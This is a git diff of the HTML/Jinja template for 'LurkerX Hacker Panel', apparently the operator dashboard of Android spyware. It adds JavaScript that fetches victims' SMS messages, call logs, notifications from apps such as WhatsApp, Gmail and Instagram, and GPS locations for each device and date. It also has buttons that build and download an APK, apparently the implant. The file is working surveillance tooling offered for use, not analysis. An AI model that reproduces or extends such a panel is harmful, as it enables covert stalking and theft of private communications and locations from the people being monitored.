@@ -5,253 +5,469 @@
   <meta charset="UTF-8">
   <title>{% block title %}Hacker Panel | LurkerX{% endblock %}</title>
   <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" />
   <style>
+:root {
+  --bg: #0f172a;
+  --panel: #111827;
+  --panel-2: #1f2937;
+  --border: #1f2937;
+  --text: #e5e7eb;
+  --text-dim: #9ca3af;
+  --accent: #10b981;
+  --accent-2: #22d3ee;
+  --danger: #ef4444;
+}
+
+* {
+  box-sizing: border-box;
+}
+
 body {
   margin: 0;
   font-family: "Consolas", "Fira Code", "Segoe UI", monospace;
-  background: #0f172a;
-  color: #d1d5db;
+  background: var(--bg);
+  color: var(--text);
   display: flex;
   height: 100vh;
 }
 
 .sidebar {
-  min-width: 200px;
-  background: #111827;
-  color: #f9fafb;
-  overflow-y: auto;
-  padding: 20px;
+  width: 260px;
+  background: var(--panel);
+  border-right: 1px solid var(--border);
   display: flex;
   flex-direction: column;
-  border-right: 1px solid #1f2937;
 }
-.sidebar h2 {
-  font-size: 1.2rem;
-  margin-bottom: 15px;
-  color: #10b981;
+.sidebar-header {
+  padding: 20px;
+  border-bottom: 1px solid var(--border);
 }
-.sidebar summary {
+.sidebar-header h2 {
+  margin: 0;
+  font-size: 1rem;
+  font-weight: 600;
+  letter-spacing: 0.05em;
+  color: var(--accent);
+  text-transform: uppercase;
+}
+.sidebar-body {
+  flex: 1;
+  overflow-y: auto;
+  padding: 16px;
+}
+.device-item {
+  padding: 10px 12px;
+  color: var(--text);
   cursor: pointer;
-  padding: 6px 8px;
   border-radius: 6px;
-  transition: background 0.2s;
+  transition: all 0.15s;
+  margin-bottom: 4px;
+  font-size: 0.9rem;
+  display: flex;
+  align-items: center;
+  gap: 8px;
 }
-.sidebar summary:hover {
-  background: rgba(16, 185, 129, 0.2);
+.device-item:hover {
+  background: rgba(34, 211, 238, 0.08);
+  color: var(--accent-2);
 }
-.sidebar a {
+.device-item.active {
+  background: rgba(34, 211, 238, 0.12);
+  color: var(--accent-2);
+  border-left: 2px solid var(--accent-2);
+}
+.device-item .material-icons-round {
+  font-size: 18px;
+  color: var(--text-dim);
+}
+.device-item.active .material-icons-round {
+  color: var(--accent-2);
+}
+
+.date-section {
+  margin-top: 16px;
+  padding-top: 12px;
+  border-top: 1px solid var(--border);
+}
+.date-section label {
   display: block;
-  padding: 5px 10px;
-  color: #38bdf8;
-  text-decoration: none;
-  border-radius: 4px;
-  transition: background 0.2s;
+  color: var(--text-dim);
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  margin-bottom: 8px;
 }
-.sidebar a:hover {
-  background: rgba(56, 189, 248, 0.15);
+.date-section input[type="date"] {
+  width: 100%;
+  padding: 10px;
+  border-radius: 6px;
+  border: 1px solid var(--border);
+  background: var(--bg);
+  color: var(--text);
+  font-family: inherit;
+  font-size: 0.9rem;
+  outline: none;
+  transition: border-color 0.15s;
+}
+.date-section input[type="date"]:focus {
+  border-color: var(--accent-2);
+}
+
+.sidebar-footer {
+  padding: 16px;
+  border-top: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+.btn {
+  width: 100%;
+  padding: 10px;
+  border: none;
+  border-radius: 6px;
+  font-family: inherit;
+  font-size: 0.85rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.15s;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+}
+.btn .material-icons-round {
+  font-size: 16px;
+}
+.btn-primary {
+  background: var(--accent);
+  color: #000;
+}
+.btn-primary:hover:not(:disabled) {
+  background: #34d399;
+}
+.btn-primary:disabled {
+  background: #374151;
+  color: var(--text-dim);
+  cursor: not-allowed;
+}
+.btn-secondary {
+  background: transparent;
+  color: var(--accent);
+  border: 1px solid var(--accent);
+}
+.btn-secondary:hover:not(:disabled) {
+  background: rgba(16, 185, 129, 0.1);
+}
+.btn-secondary:disabled {
+  opacity: 0.4;
+  cursor: not-allowed;
+}
+.build-status {
+  font-size: 0.75rem;
+  color: var(--text-dim);
+  text-align: center;
+  min-height: 1.2em;
 }
 
 .main {
   flex: 1;
-  padding: 20px;
-  overflow-y: auto;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
 }
-.main h1 {
-  margin-top: 0;
-  font-size: 1.5rem;
-  color: #facc15;
+.topbar {
+  padding: 20px 24px;
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+.topbar h1 {
+  margin: 0 0 16px 0;
+  font-size: 1.1rem;
+  font-weight: 600;
+  color: var(--text);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+}
+.control-buttons {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+}
+.control-btn {
+  padding: 8px 16px;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  background: var(--panel-2);
+  color: var(--text);
+  cursor: pointer;
+  font-family: inherit;
+  font-size: 0.85rem;
+  transition: all 0.15s;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.control-btn:hover {
+  border-color: var(--accent-2);
+  color: var(--accent-2);
+}
+.control-btn.active {
+  background: var(--accent-2);
+  color: #000;
+  border-color: var(--accent-2);
+}
+.control-btn .material-icons-round {
+  font-size: 16px;
 }
 
-.board-content {
-  background: #1e293b;
-  padding: 20px;
-  border-radius: 10px;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.6);
-  margin-top: 15px;
-  min-height: 60vh;
+.board-scroll {
+  flex: 1;
   overflow-y: auto;
-  color: #e5e7eb;
-  font-size: 0.95rem;
+  padding: 24px;
+}
+.board-content {
+  max-width: 900px;
+}
+.board-content > p {
+  color: var(--text-dim);
+  font-size: 0.9rem;
+}
+
+.card {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 16px;
+  margin-bottom: 12px;
+  transition: border-color 0.15s;
+}
+.card:hover {
+  border-color: rgba(34, 211, 238, 0.2);
+}
+.card-header {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-bottom: 10px;
+  padding-bottom: 10px;
+  border-bottom: 1px solid var(--border);
+  font-weight: 600;
+  font-size: 0.85rem;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  color: var(--accent-2);
+}
+.card-header .material-icons-round {
+  font-size: 18px;
+}
+.card-row {
+  display: flex;
+  padding: 6px 0;
+  font-size: 0.85rem;
+  border-bottom: 1px solid rgba(255,255,255,0.03);
+}
+.card-row:last-child {
+  border-bottom: none;
+}
+.card-label {
+  width: 140px;
+  color: var(--text-dim);
+  font-size: 0.8rem;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  flex-shrink: 0;
+}
+.card-value {
+  flex: 1;
+  color: var(--text);
+  word-break: break-word;
+}
+
+.section-title {
+  font-size: 0.8rem;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  color: var(--text-dim);
+  margin: 20px 0 12px 0;
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--border);
 }
 
 .filter-buttons {
-  margin-top: 15px;
   display: flex;
-  gap: 3px;
+  gap: 8px;
   flex-wrap: wrap;
+  margin-top: 12px;
 }
-.filter-buttons button {
-  padding: 8px 14px;
-  border: none;
+.filter-btn {
+  padding: 6px 12px;
+  border: 1px solid var(--border);
   border-radius: 6px;
-  background: #2563eb;
-  color: #fff;
+  background: transparent;
+  color: var(--text);
   cursor: pointer;
-  font-size: 0.9rem;
-  transition: background 0.2s;
+  font-family: inherit;
+  font-size: 0.8rem;
+  transition: all 0.15s;
 }
-.filter-buttons button:hover {
-  background: #1e40af;
-}
-.wa-btn { background: #25d366 !important; color: #000; }
-.wa-btn:hover { background: #128c7e !important; }
-.x-btn { background: #1da1f2 !important; }
-.x-btn:hover { background: #0d8ddb !important; }
-.ig-btn { background: #e1306c !important; }
-.ig-btn:hover { background: #a50e3c !important; }
-.gm-btn { background: #d93025 !important; }
-.gm-btn:hover { background: #a52714 !important; }
-
-.modal-content {
-  background: #1f2937;
-  color: #e5e7eb;
-  border: 1px solid #374151;
+.filter-btn:hover {
+  border-color: var(--accent);
+  color: var(--accent);
 }
 
+.spinner-container {
+  position: fixed;
+  top: 16px;
+  right: 16px;
+  z-index: 1000;
+  display: none;
+}
 .spinner {
-  border: 4px solid #1f2937;
-  border-top: 4px solid #10b981;
+  width: 32px;
+  height: 32px;
+  border: 3px solid var(--panel-2);
+  border-top: 3px solid var(--accent);
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+  to { transform: rotate(360deg); }
 }
 
-.view-trigger {
-  cursor: pointer;
-  color: #22d3ee;
+.login-box {
+  max-width: 420px;
+  margin: 60px auto;
+  padding: 32px;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 12px;
 }
-.view-trigger:hover {
-  color: #06b6d4;
+.login-box h1 {
+  margin: 0 0 8px 0;
+  font-size: 1.3rem;
+  color: var(--accent-2);
 }
-
-.apk-build {
-  margin-top: 8px;
-  padding: 10px;
-  background: #1e40af;
-  color: #fff;
-  text-align: center;
-  border-radius: 6px;
-  font-weight: bold;
-  cursor: pointer;
-  border: none;
+.login-box p {
+  color: var(--text-dim);
+  font-size: 0.9rem;
+  margin: 0 0 20px 0;
+}
+.login-box input {
   width: 100%;
-  font-size: 0.95rem;
-}
-.apk-build:hover:not(:disabled) {
-  background: #2563eb;
-}
-.apk-build:disabled {
-  background: #374151;
-  color: #9ca3af;
-  cursor: not-allowed;
-}
-
-.apk-download {
-  margin-top: 8px;
-  padding: 10px;
-  background: #059669;
-  color: #000;
-  text-align: center;
+  padding: 12px;
   border-radius: 6px;
-  font-weight: bold;
-  cursor: pointer;
-  text-decoration: none;
-  display: block;
+  border: 1px solid var(--border);
+  background: var(--bg);
+  color: var(--text);
+  font-family: inherit;
+  margin-bottom: 12px;
+  outline: none;
 }
-.apk-download:hover {
-  background: #10b981;
+.login-box input:focus {
+  border-color: var(--accent-2);
+}
+.login-box button {
+  width: 100%;
+  padding: 12px;
+  border: none;
+  border-radius: 6px;
+  background: var(--accent);
+  color: #000;
+  cursor: pointer;
+  font-family: inherit;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+}
+.login-box button:hover {
+  background: #34d399;
+}
+.login-error {
+  color: var(--danger);
+  font-size: 0.85rem;
+  margin-top: 12px;
+  min-height: 1.2em;
 }
   </style>
-  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 </head>
 
 <body>
-  <div class="sidebar" id="sidebar">
-    <h2>🤡 Hacker Panel</h2>
-    {% block sidebar %}
-    <ul>
-      {% for device, years in structure.items()|reverse %}
-      <li>
-        <details>
-          <summary>📱 {{ device }}</summary>
-          <ul>
-            {% for year, months in years.items()|reverse %}
-            <li>
-              <details>
-                <summary>{{ year }}</summary>
-                <ul>
-                  {% for month, days in months.items()|reverse %}
-                  <li>
-                    <details>
-                      <summary>{{ month }}</summary>
-                      <ul>
-                        {% for day, files in days.items()|reverse %}
-                        <li>
-                          <details>
-                            <summary>{{ day }}</summary>
-                            <ul>
-                              {% for file in files|reverse %}
-                              <li>
-                                <a class="view-trigger"
-                                  onclick="loadToBoard('{{ url_for('logs', filename=device ~ '/' ~ year ~ '/' ~ month ~ '/' ~ day ~ '/' ~ file) }}', '{{ file }}')">
-                                  📄 {{ file.replace('.json', '') }}
-                                </a>
-                              </li>
-                              {% endfor %}
-                            </ul>
-                          </details>
-                        </li>
-                        {% endfor %}
-                      </ul>
-                    </details>
-                  </li>
-                  {% endfor %}
-                </ul>
-              </details>
-            </li>
-            {% endfor %}
-          </ul>
-        </details>
-      </li>
-      {% endfor %}
-    </ul>
-    {% if not unauthorized %}
-    <button id="build-apk-btn" class="apk-build">Build APK</button>
-    <a id="download-apk-link" class="apk-download" href="/download_apk">Download APK</a>
-    <p id="build-status" style="color: #9ca3af; font-size: 0.85rem; margin-top: 8px;"></p>
-    {% endif %}
-    {% endblock %}
+  <div class="sidebar">
+    <div class="sidebar-header">
+      <h2>LurkerX</h2>
+    </div>
+    <div class="sidebar-body">
+      <div id="device-list"></div>
+      <div class="date-section" id="date-section" style="display:none;">
+        <label for="date-select">Date</label>
+        <input type="date" id="date-select" />
+      </div>
+    </div>
+    <div class="sidebar-footer">
+      <button id="build-apk-btn" class="btn btn-primary">
+        <span class="material-icons-round">build</span>
+        Build APK
+      </button>
+      <a id="download-apk-link" class="btn btn-secondary" href="/download_apk">
+        <span class="material-icons-round">download</span>
+        Download APK
+      </a>
+      <div id="build-status" class="build-status"></div>
+    </div>
   </div>
 
   <div class="main">
     {% if unauthorized %}
-    <div id="login-box" style="max-width: 400px; margin: 40px auto; padding: 24px; background: #1e293b; border-radius: 10px; box-shadow: 0 2px 6px rgba(0,0,0,0.6);">
-      <h1 style="margin-top: 0; font-size: 1.5rem; color: #facc15;">🔐 LurkerX Panel</h1>
-      <p style="color: #9ca3af;">Enter your token to access the panel.</p>
-      <input id="token-input" type="text" placeholder="Encrypted token" style="width: 100%; padding: 10px; margin: 12px 0; border-radius: 6px; border: 1px solid #374151; background: #0f172a; color: #e5e7eb; font-family: monospace;" />
-      <button id="login-btn" style="width: 100%; padding: 10px; border: none; border-radius: 6px; background: #10b981; color: #000; cursor: pointer; font-weight: bold;">Unlock Panel</button>
-      <p id="login-error" style="color: #ef4444; margin-top: 10px; display: none;"></p>
+    <div class="topbar" style="justify-content: center; display: flex;">
+      <div class="login-box">
+        <h1>LurkerX Panel</h1>
+        <p>Enter your token to access the panel.</p>
+        <input id="token-input" type="text" placeholder="Encrypted token" />
+        <button id="login-btn">Unlock Panel</button>
+        <p id="login-error" class="login-error"></p>
+      </div>
     </div>
     {% else %}
-    {% block content %}{% endblock %}
-
-    <h2>Popular apps</h2>
-    <div class="filter-buttons">
-      <button class="gm-btn" onclick="filterNotifications('com.google.android.gm')">Gmail</button>
-      <button onclick="filterNotifications('com.facebook.katana')">Facebook</button>
-      <button class="wa-btn" onclick="filterNotifications('com.whatsapp')">WhatsApp</button>
-      <button onclick="filterNotifications('com.facebook.lite')">Facebook Lite</button>
-      <button class="ig-btn" onclick="filterNotifications('com.instagram.android')">Instagram</button>
-      <button class="x-btn" onclick="filterNotifications('com.twitter.android')">X (Twitter)</button>
+    <div class="topbar">
+      <h1>Dashboard</h1>
+      <div class="control-buttons">
+        <button class="control-btn" onclick="loadType('sms')">
+          <span class="material-icons-round">sms</span>SMS
+        </button>
+        <button class="control-btn" onclick="loadType('calls')">
+          <span class="material-icons-round">call</span>Calls
+        </button>
+        <button class="control-btn" onclick="loadType('notifs')">
+          <span class="material-icons-round">notifications</span>Notifications
+        </button>
+        <button class="control-btn" onclick="loadType('gps')">
+          <span class="material-icons-round">location_on</span>GPS
+        </button>
+      </div>
+      <div class="filter-buttons">
+        <button class="filter-btn" onclick="filterNotifications('com.google.android.gm')">Gmail</button>
+        <button class="filter-btn" onclick="filterNotifications('com.facebook.katana')">Facebook</button>
+        <button class="filter-btn" onclick="filterNotifications('com.whatsapp')">WhatsApp</button>
+        <button class="filter-btn" onclick="filterNotifications('com.facebook.lite')">Facebook Lite</button>
+        <button class="filter-btn" onclick="filterNotifications('com.instagram.android')">Instagram</button>
+        <button class="filter-btn" onclick="filterNotifications('com.twitter.android')">X</button>
+      </div>
     </div>
-    <hr>
-
-    <div id="board-content" class="board-content">
-      <p>Select a log from the sidebar to view its details here.</p>
+    <div class="board-scroll">
+      <div id="board-content" class="board-content">
+        <p>Select a device and date from the sidebar, then use the buttons above to view logs.</p>
+      </div>
     </div>
     {% endif %}
   </div>
 
-  <div class="spinner-container">
-    <div class="spinner" id="spinner"></div>
+  <div class="spinner-container" id="spinner-container">
+    <div class="spinner"></div>
   </div>
+
   {% if unauthorized %}
   <script>
     document.getElementById("login-btn").addEventListener("click", function () {
@@ -277,7 +493,223 @@ body {
     });
   </script>
   {% endif %}
-  <script src="{{ url_for('static', filename='script.js') }}"></script>
+  <script>
+    const structure = {{ structure | tojson }};
+    const deviceListEl = document.getElementById("device-list");
+    const dateSection = document.getElementById("date-section");
+    const dateSelect = document.getElementById("date-select");
+    const boardContent = document.getElementById("board-content");
+    const spinnerContainer = document.getElementById("spinner-container");
+
+    let selectedDevice = null;
+
+    function renderDevices() {
+      deviceListEl.innerHTML = "";
+      Object.keys(structure).forEach(device => {
+        const div = document.createElement("div");
+        div.className = "device-item";
+        div.innerHTML = `<span class="material-icons-round">smartphone</span>${device}`;
+        div.addEventListener("click", () => selectDevice(device, div));
+        deviceListEl.appendChild(div);
+      });
+    }
+
+    function selectDevice(device, el) {
+      selectedDevice = device;
+      document.querySelectorAll(".device-item").forEach(item => item.classList.remove("active"));
+      el.classList.add("active");
+      dateSection.style.display = "block";
+      fetch(`/api/devices/${encodeURIComponent(device)}/dates`)
+        .then(res => res.json())
+        .then(data => {
+          dateSelect.value = "";
+          if (data.dates && data.dates.length) {
+            dateSelect.value = data.dates[0];
+          }
+        })
+        .catch(() => {
+          dateSelect.value = "";
+        });
+    }
+
+    dateSelect.addEventListener("change", () => {
+      const date = dateSelect.value;
+      if (!date || !selectedDevice) return;
+      boardContent.innerHTML = '<p style="color: var(--text-dim);">Date changed. Use buttons above to load logs.</p>';
+    });
+
+    function loadType(type) {
+      if (!selectedDevice) {
+        boardContent.innerHTML = '<p style="color: var(--danger);">Select a device first.</p>';
+        return;
+      }
+      const date = dateSelect.value;
+      if (!date) {
+        boardContent.innerHTML = '<p style="color: var(--danger);">Select a date first.</p>';
+        return;
+      }
+      spinnerContainer.style.display = "block";
+      boardContent.innerHTML = "";
+      const url = `/get_info/${type}?date=${encodeURIComponent(date)}`;
+      fetch(url, { headers: { "C-Device": selectedDevice } })
+        .then(res => res.json())
+        .then(data => {
+          const items = data.data || [];
+          if (!items.length) {
+            boardContent.innerHTML = '<p style="color: var(--text-dim);">No records found for this date.</p>';
+            return;
+          }
+          renderCards(type, items);
+        })
+        .catch(err => {
+          console.error("Error loading", type, err);
+          boardContent.innerHTML = '<p style="color: var(--danger);">Failed to load.</p>';
+        })
+        .finally(() => {
+          spinnerContainer.style.display = "none";
+        });
+    }
+
+    function renderCards(type, items) {
+      boardContent.innerHTML = "";
+      const section = document.createElement("div");
+      section.className = "section-title";
+      section.textContent = `${type.toUpperCase()} (${items.length})`;
+      boardContent.appendChild(section);
+
+      items.forEach(item => {
+        const card = document.createElement("div");
+        card.className = "card";
+        let rows = "";
+        if (type === "sms") {
+          rows = [
+            { label: "Address", value: item.address || "Unknown" },
+            { label: "Body", value: item.body },
+            { label: "Date", value: new Date(item.date).toLocaleString() },
+            { label: "Type", value: item.type },
+          ];
+        } else if (type === "calls") {
+          rows = [
+            { label: "Number", value: item.number || "Unknown" },
+            { label: "Name", value: item.name || "Unknown" },
+            { label: "Duration", value: item.duration + "s" },
+            { label: "Date", value: new Date(item.date).toLocaleString() },
+            { label: "Type", value: item.call_type },
+          ];
+        } else if (type === "notifs") {
+          rows = [
+            { label: "Package", value: item.package },
+            { label: "Title", value: item.title || "(no title)" },
+            { label: "Text", value: item.text || "(empty)" },
+            { label: "Time", value: new Date(item.timestamp).toLocaleString() },
+          ];
+        } else if (type === "gps") {
+          rows = [
+            { label: "Latitude", value: item.latitude },
+            { label: "Longitude", value: item.longitude },
+            { label: "Accuracy", value: item.accuracy },
+            { label: "Time", value: new Date(item.timestamp).toLocaleString() },
+          ];
+        }
+        card.innerHTML = rows.map(r =>
+          `<div class="card-row"><div class="card-label">${r.label}</div><div class="card-value">${r.value}</div></div>`
+        ).join("");
+        boardContent.appendChild(card);
+      });
+    }
+
+    function filterNotifications(packageName) {
+      if (!selectedDevice) {
+        boardContent.innerHTML = '<p style="color: var(--danger);">Select a device first.</p>';
+        return;
+      }
+      const date = dateSelect.value;
+      if (!date) {
+        boardContent.innerHTML = '<p style="color: var(--danger);">Select a date first.</p>';
+        return;
+      }
+      spinnerContainer.style.display = "block";
+      fetch(`/get_info/notifs?date=${encodeURIComponent(date)}`, { headers: { "C-Device": selectedDevice } })
+        .then(res => res.json())
+        .then(data => {
+          const notifs = data.data || [];
+          const filtered = notifs.filter(n => n.package === packageName);
+          if (!filtered.length) {
+            boardContent.innerHTML = `<p style="color: var(--text-dim);">No notifications found for ${packageName}.</p>`;
+            return;
+          }
+          renderCards("notifs", filtered);
+        })
+        .catch(err => {
+          console.error("Error loading notifications:", err);
+          boardContent.innerHTML = '<p style="color: var(--danger);">Failed to load notifications.</p>';
+        })
+        .finally(() => {
+          spinnerContainer.style.display = "none";
+        });
+    }
+
+    renderDevices();
+  </script>
+  {% if not unauthorized %}
+  <script>
+    document.getElementById("build-apk-btn").addEventListener("click", function () {
+      const btn = document.getElementById("build-apk-btn");
+      btn.disabled = true;
+      btn.innerHTML = '<span class="material-icons-round">hourglass_empty</span>Building...';
+      fetch("/build_apk", { method: "POST" })
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.status !== "building") {
+            btn.disabled = false;
+            btn.innerHTML = '<span class="material-icons-round">build</span>Build APK';
+          }
+        })
+        .catch(() => {
+          btn.disabled = false;
+          btn.innerHTML = '<span class="material-icons-round">build</span>Build APK';
+        });
+    });
+    setInterval(() => {
+      fetch("/build_status")
+        .then(res => res.json())
+        .then(data => {
+          const btn = document.getElementById("build-apk-btn");
+          const link = document.getElementById("download-apk-link");
+          const status = document.getElementById("build-status");
+          if (data.status === "building") {
+            btn.disabled = true;
+            btn.innerHTML = '<span class="material-icons-round">hourglass_empty</span>Building...';
+            link.style.pointerEvents = "none";
+            link.style.opacity = "0.4";
+            status.textContent = "Building APK...";
+            status.style.color = "var(--accent)";
+          } else if (data.status === "error") {
+            btn.disabled = false;
+            btn.innerHTML = '<span class="material-icons-round">build</span>Build APK';
+            link.style.pointerEvents = "auto";
+            link.style.opacity = "1";
+            status.textContent = "Build failed";
+            status.style.color = "var(--danger)";
+          } else if (data.apk_exists) {
+            btn.disabled = false;
+            btn.innerHTML = '<span class="material-icons-round">build</span>Build APK';
+            link.style.pointerEvents = "auto";
+            link.style.opacity = "1";
+            status.textContent = "APK ready";
+            status.style.color = "var(--accent)";
+          } else {
+            btn.disabled = false;
+            btn.innerHTML = '<span class="material-icons-round">build</span>Build APK';
+            link.style.pointerEvents = "none";
+            link.style.opacity = "0.4";
+            status.textContent = "APK not built yet";
+            status.style.color = "var(--text-dim)";
+          }
+        });
+    }, 2000);
+  </script>
+  {% endif %}
 </body>
 
 </html>
